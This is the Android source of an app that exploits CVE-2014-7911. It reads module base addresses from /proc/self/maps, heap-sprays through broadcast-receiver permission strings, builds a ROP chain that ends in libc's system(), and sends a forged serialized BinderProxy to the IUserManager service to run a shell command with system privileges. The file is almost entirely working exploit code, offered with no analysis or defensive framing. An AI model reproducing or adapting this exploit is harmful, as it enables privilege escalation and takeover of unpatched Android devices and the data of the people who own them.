package com.heen.CVE_2014_7911;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.UserHandle;
import android.os.UserManager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.io.FileNotFoundException;
import java.lang.reflect.Field;
import java.util.Scanner;

import AAdroid.os.BinderProxy;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "7911";
    private static final String DESCRIPTOR = "android.os.IUserManager";
    private  int sprayChunkLength = 100000;
    private int gadgetChunkLength = 60;
    //private int gadgetChunkLength = 100;
    private int TRANSACTION_setApplicationRestrictions;
    private IBinder mRemote;
    private BroadcastReceiver broadcastReceiver;
    private static String cmd = "id >/data/pwned.txt";
    private static int rop_chain[] = {0x004fed03, 0x000664c5, 0x000250e1, 0x0030c4b9};

    public MainActivity() {
        broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context arg0, Intent arg1) {
            }
        };
    }

    private void exploit(int staticAddr) {
        Context context = getBaseContext();
        try {
            Bundle bundle = new Bundle();
            BinderProxy evilProxy = new BinderProxy();
            evilProxy.mOrgue = staticAddr;
            evilProxy.mObject = staticAddr;
            bundle.putSerializable("eatthis", evilProxy);

            Class stubClass = null;
            for (Class inner : Class.forName("android.os.IUserManager").getDeclaredClasses()) {
                if (inner.getCanonicalName().equals("android.os.IUserManager.Stub")) {
                    stubClass = inner;
                }
            }

            Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField("TRANSACTION_setApplicationRestrictions");
            TRANSACTION_setApplicationRestrictionsField.setAccessible(true);
            TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(null);

            Class proxyClass = null;
            for (Class inner : stubClass.getDeclaredClasses()) {
                if (inner.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
                    proxyClass = inner;
                }
            }

            UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);
            Field mServiceField = UserManager.class.getDeclaredField("mService");
            mServiceField.setAccessible(true);
            Object mService = mServiceField.get(userManager);

            Field mRemoteField = proxyClass.getDeclaredField("mRemote");
            mRemoteField.setAccessible(true);
            mRemote = (IBinder) mRemoteField.get(mService);

            UserHandle userHandle = android.os.Process.myUserHandle();
            setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                int dalvikHeapAddr = getBase("/dev/ashmem/dalvik-heap");
                int libcAddr = getBase("/system/lib/libc.so");
                int libDvmAddr = getBase("/system/lib/libdvm.so");
                int libWebViewChromiumAddr = getBase("/system/lib/libwebviewchromium.so");

                //int staticAddr = dalvikHeapAddr + 0x01001000;
                int staticAddr = dalvikHeapAddr + 0x01001004;
                Log.d(TAG, "staticAddr = 0x" + Integer.toHexString(staticAddr));

                int gadgetChunkOffset = sprayChunkLength - gadgetChunkLength;

                char[] bytes = new char[sprayChunkLength / 2];
                int value;
                for (int i = 0; i < gadgetChunkOffset / 2; i += 2) {
                    value = staticAddr + gadgetChunkOffset - (2 * i);
                    bytes[i] = (char) value;
                    bytes[i + 1] = (char) ((value >> 16) & 0xffff);
                }

                value = 1;
                bytes[gadgetChunkOffset / 2 - 2] = (char) value;
                bytes[gadgetChunkOffset / 2 - 1] = (char) ((value >> 16) & 0xffff);

                value = staticAddr + 0xC;
                bytes[gadgetChunkOffset / 2 + 2] = (char) value;
                bytes[gadgetChunkOffset / 2 + 3] = (char) ((value >> 16) & 0xffff);

                value = libWebViewChromiumAddr + rop_chain[0];
                /*
                rop_chain[0] in libwebviewchromium.so(0x004fed02):
                 4fed02:       4628            mov     r0, r5           #r5 = STATIC_ADDRESS
                 4fed04:       682f            ldr     r7, [r5, #0]     #r7 = [STATIC_ADDRESS] = GADGET_BUFFER
                 4fed06:       f8d4 8048       ldr.w   r8, [r4, #72]   ; 0x48
                 4fed0a:       68b9            ldr     r1, [r7, #8]     #r1 = [GADGET_BUFFER+8]
                 4fed0c:       4788            blx     r1
                 */
                bytes[gadgetChunkOffset / 2] = (char) value;
                bytes[gadgetChunkOffset / 2 + 1] = (char) ((value >> 16) & 0xffff);

                value = libDvmAddr + rop_chain[1];
                /*
                rop_chain[1] in libdvm.so(0x000664c4)

                664c4:       f107 0708       add.w   r7, r7, #8   #r7=r7+8=GADGET_BUFFER+8
                664c8:       46bd            mov     sp, r7       #sp=GADGET_BUFFER+8
                664ca:       bdb0            pop     {r4, r5, r7, pc}

                # r4=[GADGET_BUFFER+8],r5=[GADGET_BUFFER+12],r7=[GADGET_BUFFER+16],pc=[GADGET_BUFFER+20], sp=GADGET_BUFFER+24

                 */
                bytes[gadgetChunkOffset / 2 + 4] = (char) value;
                bytes[gadgetChunkOffset / 2 + 5] = (char) ((value >> 16) & 0xffff);

                value = libcAddr + rop_chain[2]; // rop_chain[2] in libc.so: 000250e0 <system>
                bytes[gadgetChunkOffset / 2 + 6] = (char) value;
                bytes[gadgetChunkOffset / 2 + 7] = (char) ((value >> 16) & 0xffff);

                value = libWebViewChromiumAddr + rop_chain[3];
                /*
               rop_chain[3] in libwebviewchromium.so(0x0030c4b8)
                30c4b8:       4668            mov     r0, sp   #r0=GADGET_BUFFER+24
                30c4ba:       47a8            blx     r5       #r5=[GADGET_BUFFER+12]=system_addr
                 */
                bytes[gadgetChunkOffset / 2 + 10] = (char) value;
                bytes[gadgetChunkOffset / 2 + 11] = (char) ((value >> 16) & 0xffff);

                int[] values = stringToInt(cmd);
                for (int i = 0; i < values.length; i++) {
                    bytes[gadgetChunkOffset / 2 + 12 + i * 2] = (char) values[i];
                    bytes[gadgetChunkOffset / 2 + 13 + i * 2] = (char) ((values[i] >> 16) & 0xffff);
                }

                String str = String.valueOf(bytes);
                for (int i = 0; i < 2000; i++) {
                    heapSpary(str);
                    if (i % 100 == 0) {
                        Log.d(TAG, "heap sparying... " + i);
                    }
                }

                exploit(staticAddr);
            }
        });
    }

    private void setApplicationRestrictions(String packageName, Bundle restrictions, int
            userHandle) throws RemoteException
    {
        Parcel _data = Parcel.obtain();
        Parcel _reply = Parcel.obtain();
        try {
            _data.writeInterfaceToken(DESCRIPTOR);
            _data.writeString(packageName);
            _data.writeInt(1);
            restrictions.writeToParcel(_data, 0);
            _data.writeInt(userHandle);

            byte[] data = _data.marshall();
            for (int i=0; true; i++) {
                if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
                    data[i] = 'a';
                    data[i+1] = 'n';
                    break;
                }
            }
            _data.recycle();
            _data = Parcel.obtain();
            _data.unmarshall(data, 0, data.length);

            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
            _reply.readException();
        }
        finally {
            _reply.recycle();
            _data.recycle();
        }
    }

    private int getBase(String moduleName) {
        Scanner scanner = null;
        try {
            scanner = new Scanner(new File("/proc/self/maps"));
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();
                String[] fields = line.split("\\s+");

                if (fields.length >= 1) {
                    String addr = fields[0];
                    if (fields.length >= 6) {
                        String tag = fields[5];
                        if (moduleName.equals(tag)) {
                            String[] addrs = addr.split("-");
                            return Integer.parseInt(addrs[0], 16);
                        }
                    }
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } finally {
            if (scanner != null) {
                scanner.close();
            }
        }
        return 0;
    }

    private int[] stringToInt(String str) {
        char[] chars = str.toCharArray();
        int[] values = new int[chars.length / 4 + (chars.length % 4 == 0 ? 0 : 1)];
        int i = 0;
        for (int idx = 0; idx < values.length; idx++) {
            while (i < chars.length) {
                values[idx] += chars[i] << (8 * (i % 4));
                i++;
                if (i % 4 == 0) {
                    break;
                }
            }
        }

        return values;
    }

    private void heapSpary(String str) {
        try {
            IntentFilter inFilter = new IntentFilter();
            registerReceiver(broadcastReceiver, inFilter, str, null);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
